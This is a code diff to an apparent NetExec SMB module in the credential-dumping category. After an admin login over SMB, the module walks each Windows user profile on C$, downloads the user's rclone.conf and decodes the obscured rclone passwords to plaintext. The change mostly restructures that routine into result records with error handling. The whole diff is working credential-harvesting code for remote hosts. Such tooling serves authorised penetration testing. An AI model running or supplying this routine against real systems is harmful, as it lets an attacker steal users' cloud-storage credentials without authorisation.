@@ -1,7 +1,12 @@
 import base64
-from Crypto.Cipher import AES
+from dataclasses import dataclass
 from io import BytesIO
+
+from Crypto.Cipher import AES
+from impacket.nt_errors import STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND
+from impacket.smbconnection import SessionError
 from nxc.helpers.misc import CATEGORY
+from nxc.playbooks.results import ActionResult, ResultStatus
 
 
 class NXCModule:
@@ -10,69 +15,78 @@ class NXCModule:
     supported_protocols = ["smb"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
+    @dataclass
+    class ResultData:
+        files: list[dict]
+        queried_users: list[str]
+
+    result_type = ResultData
+
     def options(self, context, module_options):
         """No module options."""
 
     def on_admin_login(self, context, connection):
-        self.share = "C$"
-        base_dir = "\\Users"
-        skip_dirs = {"Public", "Default", "Default User", "All Users"}
-
+        files, queried_users, errors = [], [], []
+        ignored = {"public", "default", "default user", "all users", ".", ".."}
         try:
-            entries = connection.conn.listPath(self.share, base_dir + "\\*")
-        except Exception as e:
-            context.log.fail(f"Failed to list {base_dir}: {e}")
-            return False
-
-        usernames = [
-            entry.get_longname()
-            for entry in entries
-            if entry.is_directory() and entry.get_longname() not in skip_dirs | {".", ".."}
-        ]
-
-        if not usernames:
-            context.log.warning("No user directories found.")
-            return False
-
-        for username in usernames:
-            conf_path = f"\\Users\\{username}\\AppData\\Roaming\\rclone\\rclone.conf"
-            context.log.info(f"Trying to read: {self.share + conf_path}")
-            conf_data = ""
-
-            try:
-                buf = BytesIO()
-                connection.conn.getFile(self.share, conf_path, buf.write)
-                conf_data = buf.getvalue().decode()
-            except Exception:
-                context.log.info(f"[{username}] rclone.conf not found.")
-                continue
-
-            if "RCLONE_ENCRYPT_V0" in conf_data:
-                context.log.fail(f"[{username}] Encrypted config — skipping.")
-                continue
-
-            context.log.success(f"[{username}] rclone.conf found!")
-
-            for line in conf_data.splitlines():
-                line = line.strip()
-                if not line:
+            for directory in connection.conn.listPath("C$", "\\Users\\*"):
+                user = directory.get_longname()
+                if not directory.is_directory() or user.casefold() in ignored:
                     continue
-
-                if "=" not in line:
-                    context.log.highlight(line.strip())
-                    continue
-
-                key, val = map(str.strip, line.split("=", 1))
-                if key.lower() in ("pass", "password", "password2"):
+                queried_users.append(user)
+                path = f"\\Users\\{user}\\AppData\\Roaming\\rclone\\rclone.conf"
+                record = {"user": user, "path": path, "content": b"", "complete": False, "encrypted": False, "entries": [], "error": None}
+                with BytesIO() as buffer:
                     try:
-                        plain = self.deobscure(val)
-                        context.log.highlight(f"{key} = {plain}")
+                        connection.conn.getFile("C$", path, buffer.write)
+                        record["complete"] = True
+                    except SessionError as e:
+                        if e.getErrorCode() in (STATUS_NO_SUCH_FILE, STATUS_OBJECT_NAME_NOT_FOUND, STATUS_OBJECT_PATH_NOT_FOUND) and not buffer.getvalue():
+                            continue
+                        record["error"] = str(e)
+                        raise
                     except Exception as e:
-                        context.log.warning(f"[{username}] Failed to deobscure {key}: {e}")
-                else:
-                    context.log.highlight(line.strip())
-
-        return True
+                        record["error"] = str(e) or type(e).__name__
+                        raise
+                    finally:
+                        record["content"] = buffer.getvalue()
+                        if record["complete"] or record["error"]:
+                            files.append(record)
+                try:
+                    text = record["content"].decode("utf-8-sig")
+                    record["encrypted"] = any(line.strip() == "RCLONE_ENCRYPT_V0:" for line in text.splitlines())
+                    if record["encrypted"]:
+                        context.log.display(f"[{user}] Encrypted rclone config; contents retained without decoding")
+                        continue
+                    section = None
+                    for number, line in enumerate(text.splitlines(), 1):
+                        line = line.strip()
+                        if not line or line.startswith(("#", ";")):
+                            continue
+                        if line.startswith("[") and line.endswith("]"):
+                            section = line[1:-1]
+                            continue
+                        if "=" not in line:
+                            raise ValueError(f"Invalid configuration entry on line {number}")
+                        key, value = map(str.strip, line.split("=", 1))
+                        entry = {"section": section, "name": key, "value": value, "plaintext": None, "error": None}
+                        record["entries"].append(entry)
+                        if key.lower() in ("pass", "password", "password2"):
+                            try:
+                                entry["plaintext"] = self.deobscure(value)
+                            except Exception as e:
+                                entry["error"] = str(e) or type(e).__name__
+                                raise
+                        display = entry["plaintext"] if entry["plaintext"] is not None else value
+                        context.log.highlight(f"[{user}] [{section}] {key} = {display}")
+                except Exception as e:
+                    record["error"] = str(e) or type(e).__name__
+                    raise
+        except Exception as e:
+            errors.append(str(e) or type(e).__name__)
+            context.log.fail(errors[-1])
+        status = ResultStatus.FAILED if errors else ResultStatus.NEGATIVE if not files else ResultStatus.SKIPPED if all(record["encrypted"] for record in files) else ResultStatus.SUCCESS
+        return ActionResult("smb", self.name, connection.host, status, self.ResultData(files, queried_users), error="; ".join(errors) or None)
 
     def deobscure(self, obscured):
         encrypted_password = self.base64_urlsafedecode(obscured)
